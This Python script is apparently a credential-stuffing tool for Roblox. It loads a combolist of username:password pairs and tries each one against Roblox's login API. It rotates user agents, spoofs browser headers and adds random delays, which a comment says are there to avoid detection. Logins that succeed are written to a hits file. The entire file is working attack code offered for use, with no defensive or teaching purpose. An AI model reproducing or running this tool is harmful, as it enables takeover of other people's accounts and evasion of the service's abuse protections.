import requests
from colorama import Fore, init
from time import sleep
import os
import random
import json
import sys

# Initialize colorama for colored output
init(autoreset=True)

# Colors for output
MAGENTA = Fore.MAGENTA
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
RESET = Fore.RESET

# ASCII art for banner
BANNER = f"""{MAGENTA}
▒██   ██▒▓█████  ███▄    █  ▒█████   ███▄    █     ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  
▒▒ █ █ ▒░▓█   ▀  ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░░  █   ░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒   ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
 ░ █ █ ▒ ▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒   ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██▒ ▒██▒░▒████▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░   ▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒    ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░░   ░▒ ░ ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░     ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░    ░     ░      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░    ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ 
 ░    ░     ░  ░         ░     ░ ░           ░    ░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     
                                                  ░                       ░                               
{RESET}
"""

# Realistic user agents for browser simulation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
]

# Headers for realistic HTTP requests
HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Origin": "https://www.roblox.com",
    "Connection": "keep-alive",
    "Referer": "https://www.roblox.com/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "TE": "trailers"
}

def load_combolist():
    """Load the combolist file and return its lines."""
    try:
        combo_name = input(f"{MAGENTA}Enter combolist file name (e.g., combos): {RESET}")
        if not combo_name.endswith(".txt"):
            combo_name += ".txt"
        with open(combo_name, "r", encoding="utf-8") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[!] Error: File '{combo_name}' not found.{RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{RED}[!] Error loading combolist: {str(e)}{RESET}")
        sys.exit(1)

def check_account(username, password, session):
    """Check if the account credentials are valid."""
    login_url = "https://auth.roblox.com/v2/login"
    payload = {
        "ctype": "Username",
        "cvalue": username,
        "password": password
    }
    
    # Update headers with a random User-Agent
    headers = HEADERS.copy()
    headers["User-Agent"] = random.choice(USER_AGENTS)

    try:
        response = session.post(login_url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200 and "user" in response.text.lower():
            print(f"{GREEN}[✔] SUCCESS: {username}:{password}{RESET}")
            with open("hits.txt", "a", encoding="utf-8") as hits:
                hits.write(f"{username}:{password}\n")
        else:
            print(f"{RED}[✘] FAILED: {username}:{password}{RESET}")
            if response.status_code == 429:
                print(f"{YELLOW}[!] Rate limit hit, waiting 60 seconds...{RESET}")
                sleep(60)
            elif response.status_code != 200:
                print(f"{YELLOW}[!] Status code: {response.status_code}{RESET}")
                
    except requests.exceptions.RequestException as e:
        print(f"{RED}[!] Error with {username}:{password} - {str(e)}{RESET}")

def main():
    """Main function to run the checker."""
    print(f"{MAGENTA}[*] Initializing...{RESET}")
    sleep(1)
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    print(f"{MAGENTA}[*] Connected to Roblox API!{RESET}\n")

    # Load combolist
    combolist = load_combolist()
    print(f"{YELLOW}[*] Loaded {len(combolist)} accounts to check.{RESET}\n")

    # Create session for persistent connections
    session = requests.Session()

    # Process each account
    for index, combo in enumerate(combolist, 1):
        print(f"{YELLOW}[*] Checking account {index}/{len(combolist)}...{RESET}")
        try:
            username, password = combo.split(":", 1)
            check_account(username, password, session)
            sleep(random.uniform(0.5, 1.5))  # Random delay to avoid detection
        except ValueError:
            print(f"{RED}[!] Invalid format: {combo}{RESET}")
    
    print(f"\n{GREEN}[*] Checking complete! Results saved to 'hits.txt'.{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Process interrupted by user.{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}[!] Unexpected error: {str(e)}{RESET}")
        sys.exit(1)